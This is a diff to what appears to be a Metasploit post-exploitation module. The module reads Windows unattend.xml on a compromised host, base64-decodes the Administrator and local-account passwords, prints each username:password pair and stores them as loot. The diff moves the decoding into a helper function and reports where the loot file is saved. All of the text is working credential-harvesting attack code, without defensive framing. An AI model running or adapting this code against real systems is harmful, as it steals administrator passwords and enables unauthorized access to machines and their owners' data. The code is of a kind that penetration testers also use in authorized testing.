@@ -9,7 +9,6 @@ require 'msf/core'
 require 'rex'
 require 'msf/core/post/file'
 require 'rexml/document'
-require 'base64'
 
 class Metasploit3 < Msf::Post
 
@@ -32,9 +31,17 @@ class Metasploit3 < Msf::Post
 		))
 	end
 
-	# Convert encoded password to string, base64 decode it, present in human-readable format
-	def decode(enc_pword)
-		Base64.decode64(enc_pword.to_s).bytes.to_a.pack('c*').force_encoding('UTF-16LE')
+	# Store credentials for local accounts != Administrator
+	def store_creds(node_path, node_name)
+		enc_pword = node_path.get_text("Password/Value")
+		dec_pword = Rex::Text.decode_base64(enc_pword)
+		dec_pword = dec_pword.bytes.to_a.pack("C*").force_encoding("UTF-16LE")
+		user_creds = ""
+		user_creds << node_path.get_text("Username").to_s
+		user_creds << ":" << dec_pword.encode("ASCII-8BIT")
+		print_good(user_creds)
+
+		return user_creds
 	end
 
 	def unattend_parser(unattend_file)
@@ -54,7 +61,8 @@ class Metasploit3 < Msf::Post
 		# Extract credentials for the built-in Administrator account
 		pword_node = "unattend/settings/component/UserAccounts/AdministratorPassword/Value"
 		enc_admin_pword = unattend_xml.elements[pword_node].first
-		dec_admin_pword = decode(enc_admin_pword)
+		dec_admin_pword = Rex::Text.decode_base64(enc_admin_pword)
+		dec_admin_pword = dec_admin_pword.bytes.to_a.pack("C*").force_encoding("UTF-16LE")
 		admin_creds = ''
 		admin_creds << "Administrator:" << dec_admin_pword.encode("ASCII-8BIT")
 		creds << admin_creds
@@ -62,30 +70,18 @@ class Metasploit3 < Msf::Post
 
 		# Extract credentials for all local accounts in unattend.xml
 		# These accounts are likely members of the Administrators group
-		accounts_node = "unattend/settings/component/UserAccounts/LocalAccounts"
-		unattend_xml.elements.each(accounts_node) do |person|
-			if person.get_text("LocalAccount/Username")
-				enc_pword = person.get_text("LocalAccount/Password/Value")
-				dec_pword = decode(enc_pword).encode("ASCII-8BIT")
-				user_creds = ''
-				user_creds << person.get_text("LocalAccount/Username").to_s
-				user_creds << ':' << dec_pword
-				creds << user_creds
-				print_good(user_creds)
-			else person.get_text("LocalAccount/Name")
-				enc_pword = person.get_text("LocalAccount/Password/Value")
-				dec_pword = decode(enc_pword).encode("ASCII-8BIT")
-				user_creds = ''
-				user_creds << person.get_text("LocalAccount/Name").to_s
-				user_creds << ':' << dec_pword
-				creds << user_creds
-				print_good(user_creds)
+		lusers_node = "unattend/settings/component/UserAccounts/LocalAccounts/LocalAccount"
+		unattend_xml.elements.each(lusers_node) do |person|
+			if person.get_text("Username")
+				creds << store_creds(person, "Username")
+			elsif person.get_text("Name")
+				creds << store_creds(person, "Name")
 			end
 		end
+
 		return creds
 	end
 	
-
 	def run
 		print_status("Determining if unattend.xml is present...")
 
@@ -95,7 +91,7 @@ class Metasploit3 < Msf::Post
 		unattend_file = drive << path_to_unattend << 'unattend.xml'
 
 		if session.fs.file.exists?unattend_file
-			store_loot(
+			loot_path = store_loot(
 				'unattend.user.creds',
 				'text/csv',
 				session,
@@ -103,6 +99,7 @@ class Metasploit3 < Msf::Post
 				'unattend_creds.csv',
 				'Credentials found in unattend.xml'
 			)
+			print_status("Creds stored in " << loot_path)
 		else
 			print_error(unattend_file << " is not present in the default location.")
 		end
